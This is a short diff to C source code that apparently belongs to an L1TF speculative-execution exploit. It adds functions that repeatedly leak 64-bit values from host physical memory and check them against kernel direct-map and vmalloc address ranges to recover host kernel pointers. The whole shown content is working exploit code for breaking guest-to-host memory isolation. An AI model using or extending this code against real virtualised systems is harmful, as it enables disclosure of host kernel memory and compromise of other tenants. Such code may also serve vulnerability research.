@@ -1,5 +1,6 @@
 #include <stdlib.h>
 #include <string.h>
+#include <err.h>
 #include "leak.h"
 #include "l1tf.h"
 
@@ -56,6 +57,39 @@ u64 leak64(hpa_t base, hpa_t pa)
 #endif
 
         return val;
+}
+
+int in_direct_map(va_t va, va_t dm)
+{
+	return (va >> 40) == (dm >> 40);
+}
+
+int in_vmalloc(va_t va, va_t dm)
+{
+	va_t vmalloc = dm + (0x1ULL << 40);
+	return vmalloc < va && va < vmalloc+(0x20ULL << 40);
+}
+
+hva_t host_leak_ptr(hpa_t base, hva_t hdm, hpa_t pa, int (*check)(va_t, va_t))
+{
+	const int verbose = 1;
+	static int nr_tries = 0;
+	static hpa_t last_pa = 0;
+
+	if (pa != last_pa)
+		nr_tries = 0;
+	last_pa = pa;
+
+	do {
+		hva_t ptr = leak64(base, pa);
+		if (verbose)
+			dump(ptr);
+		if (check(ptr, hdm))
+			return ptr;
+	} while (++nr_tries < 100);
+
+	err(1, "host_leak_ptr(base=%lx, hdm=%lx, pa=%lx): stuck! (%d)\n", base, hdm, pa, nr_tries);
+	return -1;
 }
 
 #define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
